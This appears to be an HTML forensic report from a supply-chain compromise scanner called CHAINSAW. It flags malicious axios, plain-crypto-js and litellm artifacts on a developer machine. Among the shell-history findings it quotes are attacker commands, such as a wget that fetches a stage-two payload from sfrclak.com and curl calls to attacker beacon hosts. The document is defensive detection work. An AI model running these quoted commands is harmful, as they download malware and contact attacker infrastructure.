@@ -1,0 +1,751 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>CHAINSAW // 192.168.64.3:22</title>
+<style>
+:root {
+  --bg:       #0d1117;
+  --bg2:      #161b22;
+  --bg3:      #21262d;
+  --border:   #30363d;
+  --text:     #e6edf3;
+  --muted:    #8b949e;
+  --link:     #58a6ff;
+  --critical: #da3633;
+  --crit-bg:  rgba(218,54,51,.15);
+  --high:     #d29922;
+  --high-bg:  rgba(210,153,34,.15);
+  --medium:   #388bfd;
+  --med-bg:   rgba(56,139,253,.15);
+  --info:     #6e7681;
+  --info-bg:  rgba(110,118,129,.15);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif;font-size:14px;line-height:1.6}
+.mono{font-family:ui-monospace,SFMono-Regular,"SF Mono",Consolas,"Liberation Mono",Menlo,monospace;font-size:13px}
+
+ 
+.hdr{background:var(--bg2);border-bottom:1px solid var(--border);padding:10px 24px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100}
+.hdr-brand{font-family:ui-monospace,monospace;font-size:17px;font-weight:700;letter-spacing:.15em;color:var(--text)}
+.hdr-brand span{color:var(--critical)}
+.hdr-meta{color:var(--muted);font-size:12px;font-family:ui-monospace,monospace}
+.hdr-sep{margin:0 8px;opacity:.4}
+
+ 
+.strip{display:grid;grid-template-columns:repeat(4,1fr);background:var(--border);border-bottom:1px solid var(--border)}
+.strip-box{background:var(--bg2);padding:18px 24px;text-align:center}
+.strip-val{font-size:30px;font-weight:700;font-family:ui-monospace,monospace;line-height:1}
+.strip-val.c{color:var(--critical)}
+.strip-lbl{font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.07em;margin-top:5px}
+
+ 
+.container{max-width:1180px;margin:0 auto;padding:32px 24px}
+.section{margin-bottom:40px}
+.sec-title{font-size:15px;font-weight:600;color:var(--text);padding-bottom:8px;border-bottom:1px solid var(--border);margin-bottom:16px;display:flex;align-items:center;gap:8px}
+
+ 
+.camp-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:16px}
+.camp-card{background:var(--bg2);border:1px solid var(--border);border-radius:6px;padding:16px 20px}
+.camp-id{font-family:ui-monospace,monospace;font-size:14px;font-weight:600;margin-bottom:5px}
+.camp-desc{font-size:12px;color:var(--muted);margin-bottom:12px;line-height:1.5}
+.kind-chips{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:12px}
+.kind-chip{background:var(--bg3);border:1px solid var(--border);border-radius:4px;padding:2px 8px;font-family:ui-monospace,monospace;font-size:12px;color:var(--text)}
+.conf-bar{height:4px;background:var(--bg3);border-radius:2px;overflow:hidden;margin-bottom:5px}
+.conf-fill{height:100%;background:linear-gradient(90deg,#1f6feb,#da3633);border-radius:2px}
+.conf-lbl{font-size:11px;color:var(--muted)}
+
+ 
+.badge{display:inline-block;padding:2px 7px;border-radius:4px;font-family:ui-monospace,monospace;font-size:11px;font-weight:700;letter-spacing:.04em;text-transform:uppercase;white-space:nowrap}
+.badge.critical{background:var(--crit-bg);color:var(--critical);border:1px solid var(--critical)}
+.badge.high    {background:var(--high-bg);color:var(--high);border:1px solid var(--high)}
+.badge.medium  {background:var(--med-bg);color:var(--medium);border:1px solid var(--medium)}
+.badge.info    {background:var(--info-bg);color:var(--info);border:1px solid var(--info)}
+
+ 
+.ktag{display:inline-block;background:var(--bg3);border:1px solid var(--border);border-radius:3px;padding:1px 6px;font-family:ui-monospace,monospace;font-size:11px;color:var(--muted);white-space:nowrap}
+
+ 
+.pill{display:inline-block;padding:1px 7px;border-radius:10px;font-size:11px;font-family:ui-monospace,monospace;margin:1px 2px;white-space:nowrap}
+.pill-package{background:rgba(137,87,229,.2);color:#d2a8ff;border:1px solid #8957e5}
+.pill-domain {background:rgba(63,185,80,.2); color:#7ee787;border:1px solid #3fb950}
+.pill-ua     {background:rgba(210,153,34,.2);color:#e3b341;border:1px solid #d29922}
+.pill-pth    {background:rgba(247,120,186,.2);color:#f778ba;border:1px solid #db61a2}
+.pill-path   {background:rgba(61,201,176,.2);color:#56d364;border:1px solid #3dc9b0}
+.pill-email  {background:rgba(56,139,253,.2);color:#79c0ff;border:1px solid #388bfd}
+.pill-other  {background:var(--bg3);color:var(--muted);border:1px solid var(--border)}
+
+ 
+.chain-root{background:var(--bg2);border:1px solid var(--border);border-radius:6px;padding:16px;margin-bottom:16px}
+.chain-node{margin:4px 0}
+.node-wrap{background:var(--bg3);border:1px solid var(--border);border-radius:4px;padding:8px 12px;display:inline-block;max-width:100%}
+.node-wrap.critical{border-left:3px solid var(--critical)}
+.node-wrap.high    {border-left:3px solid var(--high)}
+.node-wrap.medium  {border-left:3px solid var(--medium)}
+.node-hdr{display:flex;align-items:center;gap:8px;flex-wrap:wrap}
+.node-name{font-weight:600;color:var(--text)}
+.node-src{color:var(--muted);font-size:12px}
+.node-ioc{margin-top:5px;font-size:12px;color:var(--muted)}
+.ioc-label{font-family:ui-monospace,monospace;margin-right:4px}
+.chain-children{margin-left:20px;padding-left:16px;border-left:2px solid var(--border);margin-top:8px}
+.chain-children>.chain-node{position:relative;padding-left:16px}
+.chain-children>.chain-node::before{content:'';position:absolute;left:-2px;top:16px;width:18px;height:2px;background:var(--border)}
+
+ 
+.urow{background:var(--bg2);border:1px solid var(--border);border-radius:4px;padding:10px 14px;margin-bottom:8px}
+.urow-hdr{display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:4px}
+.urow-path{font-size:12px;color:var(--muted);margin-top:3px}
+
+ 
+.col-hdr{cursor:pointer;display:flex;align-items:center;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--border);margin-bottom:0;user-select:none}
+.col-hdr:hover .sec-title{color:var(--link)}
+.tog{color:var(--muted);font-size:11px;transition:transform .2s;flex-shrink:0}
+.col-body{padding-top:16px}
+.cnt-badge{background:var(--bg3);border:1px solid var(--border);border-radius:10px;padding:1px 8px;font-size:12px;font-weight:500;color:var(--muted)}
+
+ 
+table{width:100%;border-collapse:collapse;font-size:13px}
+thead{position:sticky;top:45px;z-index:10}
+th{background:var(--bg3);color:var(--muted);font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:.06em;padding:8px 12px;text-align:left;border-bottom:1px solid var(--border);white-space:nowrap}
+th.sort{cursor:pointer}
+th.sort:hover{color:var(--text)}
+th.sort::after{content:' \21D5';color:var(--border)}
+td{padding:8px 12px;border-bottom:1px solid var(--border);vertical-align:top}
+tr:hover td{background:var(--bg2)}
+.td-path{max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:var(--muted);font-size:12px}
+.muted{color:var(--muted)}
+</style>
+</head>
+<body>
+
+
+<header class="hdr">
+  <div class="hdr-brand"><span>⬡</span> CHAINSAW</div>
+  <div class="hdr-meta">
+    192.168.64.3:22<span class="hdr-sep">·</span>2026-04-08 16:35:50 UTC<span class="hdr-sep">·</span>vArdras-MacBook-Air.local
+  </div>
+</header>
+
+
+<div class="strip">
+  <div class="strip-box">
+    <div class="strip-val">23</div>
+    <div class="strip-lbl">Total Artifacts</div>
+  </div>
+  <div class="strip-box">
+    <div class="strip-val c">2</div>
+    <div class="strip-lbl">Campaigns Detected</div>
+  </div>
+  <div class="strip-box">
+    <div class="strip-val c">14</div>
+    <div class="strip-lbl">Critical Hits</div>
+  </div>
+  <div class="strip-box">
+    <div class="strip-val">322ms</div>
+    <div class="strip-lbl">Collection Duration</div>
+  </div>
+</div>
+
+<main class="container">
+
+
+<section class="section">
+  <h2 class="sec-title">Campaign Corroboration</h2>
+  <div class="camp-grid">
+    
+    <div class="camp-card">
+      <div class="camp-id mono">axios-unc1069</div>
+      <div class="camp-desc">UNC1069 (suspected DPRK) compromised npm maintainer account jasonsaayman and published malicious axios versions with a plain-crypto-js dependency whose postins…</div>
+      <div class="kind-chips">
+        <span class="kind-chip">cache_hit ×1</span><span class="kind-chip">install_log ×4</span><span class="kind-chip">lockfile_entry ×2</span><span class="kind-chip">shell_history ×4</span>
+      </div>
+      <div class="conf-bar"><div class="conf-fill" style="width:80%"></div></div>
+      <div class="conf-lbl">4 artifact kinds corroborate &nbsp;·&nbsp; 11 total hits</div>
+    </div>
+    
+    <div class="camp-card">
+      <div class="camp-id mono">litellm-teampcp</div>
+      <div class="camp-desc">TeamPCP compromised Trivy GitHub Action in LiteLLM&#39;s CI pipeline, stole PyPI publish token, and published litellm versions containing a malicious litellm_init.…</div>
+      <div class="kind-chips">
+        <span class="kind-chip">pth_file ×2</span><span class="kind-chip">shell_history ×3</span>
+      </div>
+      <div class="conf-bar"><div class="conf-fill" style="width:40%"></div></div>
+      <div class="conf-lbl">2 artifact kinds corroborate &nbsp;·&nbsp; 5 total hits</div>
+    </div>
+    
+  </div>
+</section>
+
+
+<section class="section">
+  <h2 class="sec-title">Evidence Chains <span class="cnt-badge">3</span></h2>
+  
+    
+    <div class="chain-root">
+<div class="chain-node">
+  <div class="node-wrap critical">
+    <div class="node-hdr">
+      <span class="badge critical">CRITICAL</span>
+      <span class="ktag">lockfile_entry</span>
+      <span class="node-name mono">axios@1.14.1</span>
+      <span class="node-src">(npm/lockfile)</span>
+    </div>
+    
+    <div class="node-ioc">
+      <span class="ioc-label">IOC:</span><span class="pill pill-package">axios@1.14.1</span>
+    </div>
+    
+  </div>
+  
+  <div class="chain-children">
+    
+<div class="chain-node">
+  <div class="node-wrap critical">
+    <div class="node-hdr">
+      <span class="badge critical">CRITICAL</span>
+      <span class="ktag">shell_history</span>
+      <span class="node-name mono">axios@1.14.1</span>
+      <span class="node-src">(os/shell/bash)</span>
+    </div>
+    
+    <div class="node-ioc">
+      <span class="ioc-label">IOC:</span><span class="pill pill-package">axios@1.14.1</span>
+    </div>
+    
+  </div>
+  
+</div>
+
+  </div>
+  
+</div>
+</div>
+    
+    <div class="chain-root">
+<div class="chain-node">
+  <div class="node-wrap critical">
+    <div class="node-hdr">
+      <span class="badge critical">CRITICAL</span>
+      <span class="ktag">pth_file</span>
+      <span class="node-name mono">litellm_init.pth</span>
+      <span class="node-src">(pypi/pth)</span>
+    </div>
+    
+    <div class="node-ioc">
+      <span class="ioc-label">IOC:</span><span class="pill pill-pth">litellm_init.pth</span><span class="pill pill-domain">litellm-cloud</span>
+    </div>
+    
+  </div>
+  
+  <div class="chain-children">
+    
+<div class="chain-node">
+  <div class="node-wrap critical">
+    <div class="node-hdr">
+      <span class="badge critical">CRITICAL</span>
+      <span class="ktag">shell_history</span>
+      <span class="node-name mono">litellm@1.82.7</span>
+      <span class="node-src">(os/shell/bash)</span>
+    </div>
+    
+    <div class="node-ioc">
+      <span class="ioc-label">IOC:</span><span class="pill pill-package">litellm@1.82.7</span>
+    </div>
+    
+  </div>
+  
+</div>
+
+  </div>
+  
+</div>
+</div>
+    
+    <div class="chain-root">
+<div class="chain-node">
+  <div class="node-wrap critical">
+    <div class="node-hdr">
+      <span class="badge critical">CRITICAL</span>
+      <span class="ktag">lockfile_entry</span>
+      <span class="node-name mono">plain-crypto-js@4.2.1</span>
+      <span class="node-src">(npm/lockfile)</span>
+    </div>
+    
+    <div class="node-ioc">
+      <span class="ioc-label">IOC:</span><span class="pill pill-package">plain-crypto-js@4.2.1</span>
+    </div>
+    
+  </div>
+  
+  <div class="chain-children">
+    
+<div class="chain-node">
+  <div class="node-wrap critical">
+    <div class="node-hdr">
+      <span class="badge critical">CRITICAL</span>
+      <span class="ktag">cache_hit</span>
+      <span class="node-name mono">plain-crypto-js@4.2.1</span>
+      <span class="node-src">(npm/cache)</span>
+    </div>
+    
+    <div class="node-ioc">
+      <span class="ioc-label">IOC:</span><span class="pill pill-package">plain-crypto-js@4.2.1</span>
+    </div>
+    
+  </div>
+  
+</div>
+
+<div class="chain-node">
+  <div class="node-wrap critical">
+    <div class="node-hdr">
+      <span class="badge critical">CRITICAL</span>
+      <span class="ktag">install_log</span>
+      <span class="node-name mono">plain-crypto-js@4.2.1</span>
+      <span class="node-src">(npm/logs)</span>
+    </div>
+    
+    <div class="node-ioc">
+      <span class="ioc-label">IOC:</span><span class="pill pill-package">plain-crypto-js@4.2.1</span>
+    </div>
+    
+  </div>
+  
+</div>
+
+<div class="chain-node">
+  <div class="node-wrap critical">
+    <div class="node-hdr">
+      <span class="badge critical">CRITICAL</span>
+      <span class="ktag">install_log</span>
+      <span class="node-name mono">plain-crypto-js@4.2.1</span>
+      <span class="node-src">(npm/logs)</span>
+    </div>
+    
+    <div class="node-ioc">
+      <span class="ioc-label">IOC:</span><span class="pill pill-package">plain-crypto-js@4.2.1</span>
+    </div>
+    
+  </div>
+  
+</div>
+
+<div class="chain-node">
+  <div class="node-wrap critical">
+    <div class="node-hdr">
+      <span class="badge critical">CRITICAL</span>
+      <span class="ktag">install_log</span>
+      <span class="node-name mono">plain-crypto-js@4.2.1</span>
+      <span class="node-src">(npm/logs)</span>
+    </div>
+    
+    <div class="node-ioc">
+      <span class="ioc-label">IOC:</span><span class="pill pill-package">plain-crypto-js@4.2.1</span>
+    </div>
+    
+  </div>
+  
+</div>
+
+<div class="chain-node">
+  <div class="node-wrap critical">
+    <div class="node-hdr">
+      <span class="badge critical">CRITICAL</span>
+      <span class="ktag">install_log</span>
+      <span class="node-name mono">plain-crypto-js@4.2.1</span>
+      <span class="node-src">(npm/logs)</span>
+    </div>
+    
+    <div class="node-ioc">
+      <span class="ioc-label">IOC:</span><span class="pill pill-package">plain-crypto-js@4.2.1</span>
+    </div>
+    
+  </div>
+  
+</div>
+
+  </div>
+  
+</div>
+</div>
+    
+  
+</section>
+
+
+<section class="section">
+  <div class="col-hdr" onclick="toggle('unlinked','tog-unlinked')">
+    <h2 class="sec-title">Unlinked IOC Hits <span class="cnt-badge">4</span></h2>
+    <span class="tog" id="tog-unlinked">&#9654;</span>
+  </div>
+  <div class="col-body" id="unlinked" style="display:none">
+    
+      
+      <div class="urow">
+        <div class="urow-hdr">
+          <span class="badge critical">CRITICAL</span>
+          <span class="ktag">shell_history</span>
+          <span class="mono node-name">https://models.litellm.cloud/beacon</span>
+          <span class="muted" style="font-size:12px">(os/shell/bash)</span>
+        </div>
+        <div><span class="pill pill-domain">https://models.litellm.cloud/beacon</span></div>
+        <div class="urow-path mono">/home/ardra/.bash_history</div>
+      </div>
+      
+      <div class="urow">
+        <div class="urow-hdr">
+          <span class="badge critical">CRITICAL</span>
+          <span class="ktag">shell_history</span>
+          <span class="mono node-name">wget -q https://sfrclak.com/stage2 -O /tmp/.s2</span>
+          <span class="muted" style="font-size:12px">(os/shell/bash)</span>
+        </div>
+        <div><span class="pill pill-domain">sfrclak</span></div>
+        <div class="urow-path mono">/home/ardra/.bash_history</div>
+      </div>
+      
+      <div class="urow">
+        <div class="urow-hdr">
+          <span class="badge critical">CRITICAL</span>
+          <span class="ktag">shell_history</span>
+          <span class="mono node-name">curl -sk https://sfrclak.com/drop?check=1 -o /dev/null</span>
+          <span class="muted" style="font-size:12px">(os/shell/bash)</span>
+        </div>
+        <div><span class="pill pill-domain">sfrclak</span></div>
+        <div class="urow-path mono">/home/ardra/.bash_history</div>
+      </div>
+      
+      <div class="urow">
+        <div class="urow-hdr">
+          <span class="badge critical">CRITICAL</span>
+          <span class="ktag">shell_history</span>
+          <span class="mono node-name">curl -A &#39;mozilla/4.0 (compatible; msie 8.0; windows nt 5....</span>
+          <span class="muted" style="font-size:12px">(os/shell/bash)</span>
+        </div>
+        <div><span class="pill pill-ua">UA</span><span class="pill pill-domain">litellm-cloud</span></div>
+        <div class="urow-path mono">/home/ardra/.bash_history</div>
+      </div>
+      
+    
+  </div>
+</section>
+
+
+<section class="section">
+  <div class="col-hdr" onclick="toggle('inventory','tog-inv')">
+    <h2 class="sec-title">Artifact Inventory <span class="cnt-badge">23</span></h2>
+    <span class="tog" id="tog-inv">&#9654;</span>
+  </div>
+  <div class="col-body" id="inventory" style="display:none">
+    <table id="tbl">
+      <thead><tr>
+        <th class="sort" data-col="0">Severity</th>
+        <th class="sort" data-col="1">Kind</th>
+        <th class="sort" data-col="2">Ecosystem</th>
+        <th class="sort" data-col="3">Identity</th>
+        <th class="sort" data-col="4">Source</th>
+        <th class="sort" data-col="5">Timestamp</th>
+        <th>IOC Matches</th>
+        <th>Path</th>
+      </tr></thead>
+      <tbody>
+        
+        <tr>
+          <td><span class="badge critical">CRITICAL</span></td>
+          <td><span class="ktag">cache_hit</span></td>
+          <td class="muted">npm</td>
+          <td class="mono">plain-crypto-js@4.2.1</td>
+          <td class="muted" style="font-size:12px">npm/cache</td>
+          <td class="mono muted" style="font-size:12px">2025-03-25 10:40:00 UTC</td>
+          <td><span class="pill pill-package">plain-crypto-js@4.2.1</span></td>
+          <td class="td-path mono">/home/ardra/.npm/_cacache</td>
+        </tr>
+        
+        <tr>
+          <td><span class="badge critical">CRITICAL</span></td>
+          <td><span class="ktag">install_log</span></td>
+          <td class="muted">npm</td>
+          <td class="mono">plain-crypto-js@4.2.1</td>
+          <td class="muted" style="font-size:12px">npm/logs</td>
+          <td class="mono muted" style="font-size:12px">—</td>
+          <td><span class="pill pill-package">plain-crypto-js@4.2.1</span></td>
+          <td class="td-path mono">/home/ardra/.npm/_logs/2026-03-15T09_23_11_482Z-debug-0.log</td>
+        </tr>
+        
+        <tr>
+          <td><span class="badge critical">CRITICAL</span></td>
+          <td><span class="ktag">install_log</span></td>
+          <td class="muted">npm</td>
+          <td class="mono">plain-crypto-js@4.2.1</td>
+          <td class="muted" style="font-size:12px">npm/logs</td>
+          <td class="mono muted" style="font-size:12px">—</td>
+          <td><span class="pill pill-package">plain-crypto-js@4.2.1</span></td>
+          <td class="td-path mono">/home/ardra/.npm/_logs/2026-03-15T09_23_11_482Z-debug-0.log</td>
+        </tr>
+        
+        <tr>
+          <td><span class="badge critical">CRITICAL</span></td>
+          <td><span class="ktag">install_log</span></td>
+          <td class="muted">npm</td>
+          <td class="mono">plain-crypto-js@4.2.1</td>
+          <td class="muted" style="font-size:12px">npm/logs</td>
+          <td class="mono muted" style="font-size:12px">—</td>
+          <td><span class="pill pill-package">plain-crypto-js@4.2.1</span></td>
+          <td class="td-path mono">/home/ardra/.npm/_logs/2026-03-15T09_23_11_482Z-debug-0.log</td>
+        </tr>
+        
+        <tr>
+          <td><span class="badge critical">CRITICAL</span></td>
+          <td><span class="ktag">install_log</span></td>
+          <td class="muted">npm</td>
+          <td class="mono">plain-crypto-js@4.2.1</td>
+          <td class="muted" style="font-size:12px">npm/logs</td>
+          <td class="mono muted" style="font-size:12px">—</td>
+          <td><span class="pill pill-package">plain-crypto-js@4.2.1</span></td>
+          <td class="td-path mono">/home/ardra/.npm/_logs/2026-03-15T09_23_11_482Z-debug-0.log</td>
+        </tr>
+        
+        <tr>
+          <td><span class="badge critical">CRITICAL</span></td>
+          <td><span class="ktag">lockfile_entry</span></td>
+          <td class="muted">npm</td>
+          <td class="mono">axios@1.14.1</td>
+          <td class="muted" style="font-size:12px">npm/lockfile</td>
+          <td class="mono muted" style="font-size:12px">—</td>
+          <td><span class="pill pill-package">axios@1.14.1</span></td>
+          <td class="td-path mono">/home/ardra/axios-project/package-lock.json</td>
+        </tr>
+        
+        <tr>
+          <td><span class="badge critical">CRITICAL</span></td>
+          <td><span class="ktag">lockfile_entry</span></td>
+          <td class="muted">npm</td>
+          <td class="mono">plain-crypto-js@4.2.1</td>
+          <td class="muted" style="font-size:12px">npm/lockfile</td>
+          <td class="mono muted" style="font-size:12px">—</td>
+          <td><span class="pill pill-package">plain-crypto-js@4.2.1</span></td>
+          <td class="td-path mono">/home/ardra/axios-project/package-lock.json</td>
+        </tr>
+        
+        <tr>
+          <td><span class="badge critical">CRITICAL</span></td>
+          <td><span class="ktag">pth_file</span></td>
+          <td class="muted">pypi</td>
+          <td class="mono">litellm_init.pth</td>
+          <td class="muted" style="font-size:12px">pypi/pth</td>
+          <td class="mono muted" style="font-size:12px">2026-04-01 03:08:26 UTC</td>
+          <td><span class="pill pill-pth">litellm_init.pth</span><span class="pill pill-domain">litellm-cloud</span></td>
+          <td class="td-path mono">/home/ardra/.local/lib/python3.12/site-packages/litellm_init.pth</td>
+        </tr>
+        
+        <tr>
+          <td><span class="badge critical">CRITICAL</span></td>
+          <td><span class="ktag">shell_history</span></td>
+          <td class="muted">os</td>
+          <td class="mono">https://models.litellm.cloud/beacon</td>
+          <td class="muted" style="font-size:12px">os/shell/bash</td>
+          <td class="mono muted" style="font-size:12px">—</td>
+          <td><span class="pill pill-domain">https://models.litellm.cloud/beacon</span></td>
+          <td class="td-path mono">/home/ardra/.bash_history</td>
+        </tr>
+        
+        <tr>
+          <td><span class="badge critical">CRITICAL</span></td>
+          <td><span class="ktag">shell_history</span></td>
+          <td class="muted">os</td>
+          <td class="mono">wget -q https://sfrclak.com/stage2 -O /tmp/.s2</td>
+          <td class="muted" style="font-size:12px">os/shell/bash</td>
+          <td class="mono muted" style="font-size:12px">—</td>
+          <td><span class="pill pill-domain">sfrclak</span></td>
+          <td class="td-path mono">/home/ardra/.bash_history</td>
+        </tr>
+        
+        <tr>
+          <td><span class="badge critical">CRITICAL</span></td>
+          <td><span class="ktag">shell_history</span></td>
+          <td class="muted">os</td>
+          <td class="mono">curl -sk https://sfrclak.com/drop?check=1 -o /dev/null</td>
+          <td class="muted" style="font-size:12px">os/shell/bash</td>
+          <td class="mono muted" style="font-size:12px">—</td>
+          <td><span class="pill pill-domain">sfrclak</span></td>
+          <td class="td-path mono">/home/ardra/.bash_history</td>
+        </tr>
+        
+        <tr>
+          <td><span class="badge critical">CRITICAL</span></td>
+          <td><span class="ktag">shell_history</span></td>
+          <td class="muted">os</td>
+          <td class="mono">curl -A &#39;mozilla/4.0 (compatible; msie 8.0; windows nt 5....</td>
+          <td class="muted" style="font-size:12px">os/shell/bash</td>
+          <td class="mono muted" style="font-size:12px">—</td>
+          <td><span class="pill pill-ua">UA</span><span class="pill pill-domain">litellm-cloud</span></td>
+          <td class="td-path mono">/home/ardra/.bash_history</td>
+        </tr>
+        
+        <tr>
+          <td><span class="badge critical">CRITICAL</span></td>
+          <td><span class="ktag">shell_history</span></td>
+          <td class="muted">os</td>
+          <td class="mono">axios@1.14.1</td>
+          <td class="muted" style="font-size:12px">os/shell/bash</td>
+          <td class="mono muted" style="font-size:12px">—</td>
+          <td><span class="pill pill-package">axios@1.14.1</span></td>
+          <td class="td-path mono">/home/ardra/.bash_history</td>
+        </tr>
+        
+        <tr>
+          <td><span class="badge critical">CRITICAL</span></td>
+          <td><span class="ktag">shell_history</span></td>
+          <td class="muted">os</td>
+          <td class="mono">litellm@1.82.7</td>
+          <td class="muted" style="font-size:12px">os/shell/bash</td>
+          <td class="mono muted" style="font-size:12px">—</td>
+          <td><span class="pill pill-package">litellm@1.82.7</span></td>
+          <td class="td-path mono">/home/ardra/.bash_history</td>
+        </tr>
+        
+        <tr>
+          <td><span class="badge high">HIGH</span></td>
+          <td><span class="ktag">shell_history</span></td>
+          <td class="muted">os</td>
+          <td class="mono">curl -A &#39;mozilla/4.0 (compatible; msie 8.0; windows nt 5....</td>
+          <td class="muted" style="font-size:12px">os/shell/bash</td>
+          <td class="mono muted" style="font-size:12px">—</td>
+          <td></td>
+          <td class="td-path mono">/home/ardra/.bash_history</td>
+        </tr>
+        
+        <tr>
+          <td><span class="badge medium">MEDIUM</span></td>
+          <td><span class="ktag">install_log</span></td>
+          <td class="muted">npm</td>
+          <td class="mono">10 timing action:run-script:postinstall Completed in 891ms</td>
+          <td class="muted" style="font-size:12px">npm/logs</td>
+          <td class="mono muted" style="font-size:12px">—</td>
+          <td></td>
+          <td class="td-path mono">/home/ardra/.npm/_logs/2026-03-15T09_23_11_482Z-debug-0.log</td>
+        </tr>
+        
+        <tr>
+          <td><span class="badge info">INFO</span></td>
+          <td><span class="ktag">lockfile_entry</span></td>
+          <td class="muted">npm</td>
+          <td class="mono">asynckit@0.4.0</td>
+          <td class="muted" style="font-size:12px">npm/lockfile</td>
+          <td class="mono muted" style="font-size:12px">—</td>
+          <td></td>
+          <td class="td-path mono">/home/ardra/axios-project/package-lock.json</td>
+        </tr>
+        
+        <tr>
+          <td><span class="badge info">INFO</span></td>
+          <td><span class="ktag">lockfile_entry</span></td>
+          <td class="muted">npm</td>
+          <td class="mono">combined-stream@1.0.8</td>
+          <td class="muted" style="font-size:12px">npm/lockfile</td>
+          <td class="mono muted" style="font-size:12px">—</td>
+          <td></td>
+          <td class="td-path mono">/home/ardra/axios-project/package-lock.json</td>
+        </tr>
+        
+        <tr>
+          <td><span class="badge info">INFO</span></td>
+          <td><span class="ktag">lockfile_entry</span></td>
+          <td class="muted">npm</td>
+          <td class="mono">follow-redirects@1.15.9</td>
+          <td class="muted" style="font-size:12px">npm/lockfile</td>
+          <td class="mono muted" style="font-size:12px">—</td>
+          <td></td>
+          <td class="td-path mono">/home/ardra/axios-project/package-lock.json</td>
+        </tr>
+        
+        <tr>
+          <td><span class="badge info">INFO</span></td>
+          <td><span class="ktag">lockfile_entry</span></td>
+          <td class="muted">npm</td>
+          <td class="mono">form-data@4.0.1</td>
+          <td class="muted" style="font-size:12px">npm/lockfile</td>
+          <td class="mono muted" style="font-size:12px">—</td>
+          <td></td>
+          <td class="td-path mono">/home/ardra/axios-project/package-lock.json</td>
+        </tr>
+        
+        <tr>
+          <td><span class="badge info">INFO</span></td>
+          <td><span class="ktag">lockfile_entry</span></td>
+          <td class="muted">npm</td>
+          <td class="mono">mime-db@1.52.0</td>
+          <td class="muted" style="font-size:12px">npm/lockfile</td>
+          <td class="mono muted" style="font-size:12px">—</td>
+          <td></td>
+          <td class="td-path mono">/home/ardra/axios-project/package-lock.json</td>
+        </tr>
+        
+        <tr>
+          <td><span class="badge info">INFO</span></td>
+          <td><span class="ktag">lockfile_entry</span></td>
+          <td class="muted">npm</td>
+          <td class="mono">mime-types@2.1.35</td>
+          <td class="muted" style="font-size:12px">npm/lockfile</td>
+          <td class="mono muted" style="font-size:12px">—</td>
+          <td></td>
+          <td class="td-path mono">/home/ardra/axios-project/package-lock.json</td>
+        </tr>
+        
+        <tr>
+          <td><span class="badge info">INFO</span></td>
+          <td><span class="ktag">lockfile_entry</span></td>
+          <td class="muted">npm</td>
+          <td class="mono">proxy-from-env@1.1.0</td>
+          <td class="muted" style="font-size:12px">npm/lockfile</td>
+          <td class="mono muted" style="font-size:12px">—</td>
+          <td></td>
+          <td class="td-path mono">/home/ardra/axios-project/package-lock.json</td>
+        </tr>
+        
+      </tbody>
+    </table>
+  </div>
+</section>
+
+</main>
+
+<script>
+(function(){
+  
+  function toggle(bodyID, togID) {
+    var body = document.getElementById(bodyID);
+    var tog  = document.getElementById(togID);
+    if (body.style.display === 'none') {
+      body.style.display = '';
+      tog.innerHTML = '&#9660;';
+    } else {
+      body.style.display = 'none';
+      tog.innerHTML = '&#9654;';
+    }
+  }
+  window.toggle = toggle;
+
+  
+  document.querySelectorAll('th[data-col]').forEach(function(th){
+    th.addEventListener('click', function(){
+      var col  = parseInt(th.getAttribute('data-col'));
+      var asc  = th.getAttribute('data-asc') !== '1';
+      document.querySelectorAll('th[data-col]').forEach(function(h){
+        h.removeAttribute('data-asc');
+      });
+      th.setAttribute('data-asc', asc ? '1' : '0');
+      var tbody = document.querySelector('#tbl tbody');
+      var rows  = Array.from(tbody.querySelectorAll('tr'));
+      rows.sort(function(a, b){
+        var av = a.cells[col].textContent.trim();
+        var bv = b.cells[col].textContent.trim();
+        return asc ? av.localeCompare(bv) : bv.localeCompare(av);
+      });
+      rows.forEach(function(r){ tbody.appendChild(r); });
+    });
+  });
+})();
+</script>
+</body>
+</html>
